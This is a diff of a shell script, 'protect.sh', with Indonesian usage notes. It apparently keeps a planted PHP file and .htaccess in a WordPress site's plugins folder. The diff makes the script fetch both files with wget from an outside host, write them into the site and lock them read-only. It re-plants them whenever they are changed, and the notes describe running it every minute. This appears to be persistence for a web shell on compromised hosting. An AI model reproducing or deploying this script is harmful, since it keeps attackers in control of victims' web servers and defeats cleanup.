@@ -1,39 +1,67 @@
 #!/bin/sh
 
+
 FILE="/home/u200768895/domains/ironbaylogistics.com/public_html/wp-content/plugins/file.php"
-SAFE="/home/u200768895/domains/ssbelectrical.ca/public_html/wp-content/plugins/jeg-elementor-kit/file_backup.php"
-
-if [ ! -f "$FILE" ]; then
-    cp "$SAFE" "$FILE"
-    chmod 444 "$FILE"
-fi
-
-if [ -f "$FILE" ] && ! cmp -s "$FILE" "$SAFE"; then
-    chmod 644 "$FILE"
-    cp "$SAFE" "$FILE"
-    chmod 444 "$FILE"
-fi
+FILEURL="https://malam.545565.rest/spongebob/index.php"
 
 HTFILE="/home/u200768895/domains/ironbaylogistics.com/public_html/wp-content/plugins/.htaccess"
-HTSAFE="/home/u200768895/domains/ssbelectrical.ca/public_html/wp-content/plugins/jeg-elementor-kit/.htaccess"
+HTURL="https://malam.545565.rest/spongebob/.htaccess"
 
-if [ ! -f "$HTFILE" ]; then
-    cp "$HTSAFE" "$HTFILE"
-    chmod 444 "$HTFILE"
+TMP1="/tmp/file_restore.tmp"
+TMP2="/tmp/ht_restore.tmp"
+
+
+wget -q -O "$TMP1" "$FILEURL"
+
+if [ -f "$TMP1" ]; then
+
+    if [ ! -f "$FILE" ]; then
+        cp "$TMP1" "$FILE"
+        chmod 444 "$FILE"
+    fi
+
+    if [ -f "$FILE" ] && ! cmp -s "$FILE" "$TMP1"; then
+        chmod 644 "$FILE"
+        cp "$TMP1" "$FILE"
+        chmod 444 "$FILE"
+    fi
 fi
 
-if [ -f "$HTFILE" ] && ! cmp -s "$HTFILE" "$HTSAFE"; then
-    chmod 644 "$HTFILE"
-    cp "$HTSAFE" "$HTFILE"
-    chmod 444 "$HTFILE"
+# =========================
+# .HTACCESS PROTECTION
+# =========================
+
+wget -q -O "$TMP2" "$HTURL"
+
+if [ -f "$TMP2" ]; then
+
+    if [ ! -f "$HTFILE" ]; then
+        cp "$TMP2" "$HTFILE"
+        chmod 444 "$HTFILE"
+    fi
+
+    if [ -f "$HTFILE" ] && ! cmp -s "$HTFILE" "$TMP2"; then
+        chmod 644 "$HTFILE"
+        cp "$TMP2" "$HTFILE"
+        chmod 444 "$HTFILE"
+    fi
 fi
 
+rm -f "$TMP1" "$TMP2"
 
-===============================================================
+==========================================================================================
 
-sudah upload di file yang dimau contoh
-langsung jalankan ( manual )
-sh protect.sh
+- sed -i 's/\r$//' protect.sh
+- chmod +x protect.sh
 
-jalnkan otomatis 1 menit ( otomatis ) di file yang kita simpan
-sh /home/u200768895/domains/ironbaylogistics.com/public_html/protect.sh
+manual jalankan SH
+- sh protect.sh
+
+mau otomatis jalankan SH gini
+- sh /home/u200768895/domains/ironbaylogistics.com/public_html/protect.sh
+
+
+
+
+
+
